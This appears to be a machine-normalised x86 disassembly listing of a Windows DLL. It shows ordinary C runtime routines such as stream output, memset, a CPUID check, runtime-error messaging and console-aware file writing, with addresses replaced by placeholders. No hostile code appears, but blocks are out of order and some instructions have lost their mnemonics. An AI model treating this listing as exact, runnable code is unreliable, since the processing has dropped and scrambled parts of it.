cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_1002b5ee
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
cmp edi ebx
mov [ esi + 0x4 ] ecx
jle r-xdata
push [ ebp + 0xc ]
call sub_10031ab0
pop ecx
test eax eax
jne r-xdata
call sub_10022fff
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_1002b5ee
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_1002b6ca
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_10031997
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_10029ba9
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_10029a45
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_10029bdc
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_10029ba9
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_10029c02
mov edi edi
push ebp
mov ebp esp
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov al [ ebx ]
dec [ ebp + 0x8 ]
mov ecx edi
call sub_10029ba9
inc ebx
cmp [ esi ] 0xffffffff
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
add [ esi ] eax
jmp r-xdata
call sub_10026065
cmp [ eax ] 0x2a
jne r-xdata
mov ecx edi
mov al 0x3f
call sub_10029ba9
sub_10029c4f
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x24c ] esi
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x238 ] eax
call sub_10023358
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_10026065
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10020579
add esp 0x14
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor ecx ecx
cmp ebx ecx
je r-xdata
push esi
call sub_1002ae89
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x220 ] ecx
mov [ ebp - 0x244 ] ecx
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc ebx
cmp [ ebp - 0x228 ] 0x0
mov [ ebp - 0x23c ] ebx
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x228 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov al dl
sub al 0x20
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor esi esi
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
xor esi esi
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov ebx [ ebp - 0x23c ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x26c ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x26c ]
mov edi [ ebp - 0x224 ]
mov dl al
jmp r-xdata
sub_1002a7e7
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor ebx ebx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
cmp edi ebx
je r-xdata
call sub_10026065
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp edi eax
ja r-xdata
cmp esi ebx
jne r-xdata
pop ebx
leave
retn
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
mov [ ebp - 0x1c ] edi
call sub_10026065
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop edi
pop esi
cmp eax ebx
jl r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi - 0x1 ] bl
setge al
dec eax
dec eax
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_10029a45
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_1002a8b3
mov edi edi
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
call sub_10026065
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_10026065
mov [ eax ] 0x16
jmp r-xdata
cmp [ ebp + 0xc ] ebx
ja r-xdata
pop ebx
pop ebp
retn
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10020579
add esp 0x14
or eax 0xffffffff
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_10031cb3
call sub_1002a7e7
add esp 0x18
cmp eax ebx
jge r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov [ esi ] bl
pop esi
call sub_10026065
mov [ eax ] 0x22
sub_1002a93b
push ebp
mov ebp esp
sub esp 0x4
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
shr ecx 0x7
pxor xmm0 xmm0
jmp r-xdata
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm0
movdqa [ edi + 0x20 ] xmm0
movdqa [ edi + 0x30 ] xmm0
movdqa [ edi + 0x40 ] xmm0
movdqa [ edi + 0x50 ] xmm0
movdqa [ edi + 0x60 ] xmm0
movdqa [ edi + 0x70 ] xmm0
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_1002a992
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0x8 ]
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
test edi edi
jne r-xdata
neg edi
add edi 0x10
mov [ ebp - 0x10 ] edi
xor eax eax
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
[ edi ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
add ecx eax
sub edx eax
push edx
push 0x0
push ecx
call sub_1002a992
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
and edx 0x7f
mov [ ebp - 0xc ] edx
cmp ecx edx
je r-xdata
test edx edx
je r-xdata
sub ecx edx
push ecx
push eax
call sub_1002a93b
add esp 0x8
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
add eax [ ebp + 0x10 ]
sub eax edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
[ edi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_1002aa71
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
push ebx
pushfd
pop eax
mov ecx eax
xor eax 0x200000
push eax
popfd
pushfd
pop edx
sub edx ecx
je r-xdata
pop ebx
test [ ebp - 0x4 ] 0x4000000
je r-xdata
push ecx
popfd
xor eax eax
cpuid
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
call sub_1002aa21
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebx
leave
retn
sub_1002aae0
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
xor esi esi
xor edi edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jae r-xdata
inc edi
mov [ ebp - 0x4 ] edi
cmp edi 0x17
jb r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x3
call sub_100329ec
pop ecx
cmp eax 0x1
je r-xdata
cmp ebx [ edi * 8 + rw-data ]
je r-xdata
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
push 0x3
call sub_100329ec
pop ecx
test eax eax
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
lea esi [ edi * 8 + rw-data ]
push [ esi ]
call sub_100200e0
pop ecx
push eax
push [ esi ]
push ebx
call [ WriteFile@IAT ]
push r--data
mov ebx 0x314
push ebx
mov edi rw-data
push edi
call sub_1002776c
add esp 0xc
test eax eax
je r-xdata
push 0x104
mov esi rw-data
push esi
push 0x0
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_10020451
add esp 0x14
push esi
call sub_100200e0
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
push r--data
push 0x2fb
push esi
call sub_1002776c
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
call sub_100200e0
sub esi 0x3b
add eax esi
push 0x3
mov ecx rw-data
push r--data
sub ecx eax
push ecx
push eax
call sub_1002f63b
add esp 0x14
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10020451
add esp 0x14
mov eax [ ebp - 0x4 ]
push [ eax * 8 + rw-data ]
push ebx
push edi
call sub_1002f5c7
add esp 0xc
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_10020451
add esp 0x14
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_10020451
add esp 0x14
jmp r-xdata
push 0x12010
push r--data
push edi
call sub_10032883
add esp 0xc
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_10020451
add esp 0x14
push r--data
push ebx
push edi
call sub_1002f5c7
add esp 0xc
test eax eax
je r-xdata
sub_1002ac8b
push 0x3
call sub_100329ec
pop ecx
cmp eax 0x1
je r-xdata
push 0xfc
call sub_1002aae0
push 0xff
call sub_1002aae0
pop ecx
pop ecx
push 0x3
call sub_100329ec
pop ecx
test eax eax
jne r-xdata
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_1002acc4
mov edi edi
push ebp
mov ebp esp
sub esp 0x94
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x18 ]
xor ebx ebx
cmp [ ebp + 0xc ] 0x1
push edi
mov [ ebp - 0x8c ] eax
mov [ ebp - 0x94 ] esi
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
push ebx
push 0x80
lea edi [ ebp - 0x84 ]
mov ecx edi
push ecx
push [ ebp + 0x14 ]
mov [ ebp - 0x88 ] ebx
push [ ebp + 0x10 ]
push eax
call sub_10032baa
mov esi eax
add esp 0x18
cmp esi ebx
jne r-xdata
or eax 0xffffffff
push ebx
push 0x4
mov edi rw-data
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_10032a37
add esp 0x18
test eax eax
je r-xdata
push 0x1
push esi
call sub_10026cea
pop ecx
pop ecx
mov ecx [ ebp - 0x94 ]
mov [ ecx ] eax
cmp eax ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov [ esi ] bl
lea ecx [ esi - 0x1 ]
push ecx
push edi
push esi
push eax
call sub_1002f63b
add esp 0x10
test eax eax
je r-xdata
cmp [ ebp - 0x88 ] ebx
je r-xdata
push ebx
push ebx
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8c ]
call sub_10032baa
add esp 0x18
mov [ ebp - 0x90 ] eax
cmp eax ebx
je r-xdata
xor eax eax
jmp r-xdata
mov al [ esi ]
mov cl 0xa
imul cl
add al bl
sub al 0x30
inc edi
inc edi
cmp edi rw-data
mov [ esi ] al
jl r-xdata
cmp [ ebp - 0x88 ] ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10020451
add esp 0x14
push edi
call sub_100207fd
pop ecx
xor esi esi
inc esi
push esi
push eax
call sub_10026cea
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn
mov bl [ edi ]
movzx eax bl
push eax
call sub_1002352e
pop ecx
test eax eax
je r-xdata
jmp r-xdata
push edi
call sub_100207fd
pop ecx
push ebx
push [ ebp - 0x90 ]
mov [ ebp - 0x88 ] esi
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8c ]
call sub_10032baa
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
sub_1002ae52
mov edi edi
push esi
call sub_10027e0b
mov esi eax
test esi esi
jne r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
call sub_10026065
mov [ eax ] 0xc
xor eax eax
pop esi
retn
mov eax [ esi + 0x44 ]
pop esi
retn
push 0x24
call sub_10026ca5
pop ecx
mov [ esi + 0x44 ] eax
test eax eax
je r-xdata
sub_1002ae89
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0x10 ]
call sub_10026065
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
sub_1002aebb
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_10027570
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
xor esi esi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] esi
mov [ ebp - 0x1ad0 ] esi
cmp [ ebp + 0x10 ] esi
jne r-xdata
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
lea esi [ eax * 4 + rw-data ]
mov eax [ esi ]
and edi 0x1f
shl edi 0x6
add eax edi
mov bl [ eax + 0x24 ]
add bl bl
sar bl 0x1
mov [ ebp - 0x1ad8 ] esi
mov [ ebp - 0x1ad9 ] bl
cmp bl 0x2
je r-xdata
call sub_10026078
mov [ eax ] esi
call sub_10026065
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_10020040
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
call sub_10026078
xor esi esi
mov [ eax ] esi
call sub_10026065
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
jmp r-xdata
push [ ebp + 0x8 ]
call sub_10031ab0
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_10031912
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop edi
pop ebx
push 0x0
lea ecx [ ebp - 0x1ad4 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac0 ] ecx
test bl bl
jne r-xdata
call sub_10027e84
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae4 ]
sete cl
push eax
mov eax [ esi ]
push [ edi + eax ]
mov [ ebp - 0x1ae0 ] ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
mov eax [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
mov [ ebp - 0x1abc ] eax
cmp bl 0x2
jne r-xdata
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
xor ecx ecx
cmp [ ebp - 0x1ae0 ] ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
jmp r-xdata
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae4 ] eax
xor eax eax
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
test bl bl
je r-xdata
mov esi [ ebp - 0x1ad8 ]
push 0x5
pop esi
cmp [ ebp - 0x1ac0 ] esi
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
jmp r-xdata
call sub_10026065
mov [ eax ] 0x1c
call sub_10026078
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov ecx [ ebp - 0x1ac4 ]
and [ ebp - 0x1abc ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
mov [ ebp - 0x1abc ] eax
mov eax [ esi ]
add eax edi
test [ eax + 0x4 ] 0x80
je r-xdata
push [ ebp - 0x1ac0 ]
call sub_1002608b
pop ecx
jmp r-xdata
call sub_10026065
mov [ eax ] 0x9
call sub_10026078
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1abc ]
movzx edx [ edx ]
add [ ebp - 0x1abc ] esi
add ecx esi
cmp dx 0xa
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
xor eax eax
jmp r-xdata
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1ac4 ]
inc [ ebp - 0x1ac4 ]
mov dl [ edx ]
inc ecx
cmp dl 0xa
jne r-xdata
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1ad8 ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae0 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac4 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac4 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac4 ] esi
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1abc ]
add [ ebp - 0x1abc ] 0x2
movzx edx [ edx ]
inc ecx
inc ecx
cmp dx 0xa
jne r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
mov [ eax ] dl
inc eax
inc [ ebp - 0x1abc ]
cmp [ ebp - 0x1abc ] 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc [ ebp - 0x1abc ]
movzx esi [ ebx ]
xor ecx ecx
cmp si 0xa
sete cl
inc ebx
inc ebx
add [ ebp - 0x1abc ] 0x2
mov [ ebp - 0x1ac0 ] esi
mov [ ebp - 0x1ae0 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_100309bd
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
add esi [ ebp - 0x1ad4 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
add [ ebp - 0x1ac4 ] 0x2
mov [ eax ] dx
inc eax
inc eax
cmp [ ebp - 0x1ac4 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] 0x2
push 0xd
pop ebx
mov [ eax ] bx
inc eax
inc eax
add [ ebp - 0x1ac4 ] 0x2
mov eax [ ebp - 0x1ac4 ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp - 0x1ac0 ]
call sub_10032be7
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1ac0 ]
push eax
call sub_10032dc3
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1abc ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1ac0 ]
push ecx
push eax
push [ ebp - 0x1ae4 ]
inc ebx
inc [ ebp - 0x1abc ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1ac0 ]
push ebx
push eax
call sub_10032dc3
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1ac0 ] eax
call sub_10032be7
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
mov al [ ebp - 0x1ad9 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1abc ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1abc ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
cmp [ ebp - 0x1ac4 ] esi
mov [ ebp - 0x1ac8 ] eax
jl r-xdata
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_1002b5ee
push 0x10
push r--data
call sub_10028b48
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_10026078
and [ eax ] 0x0
call sub_10026065
mov [ eax ] 0x9
call sub_10026078
mov [ eax ] edi
call sub_10026065
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_10020579
add esp 0x14
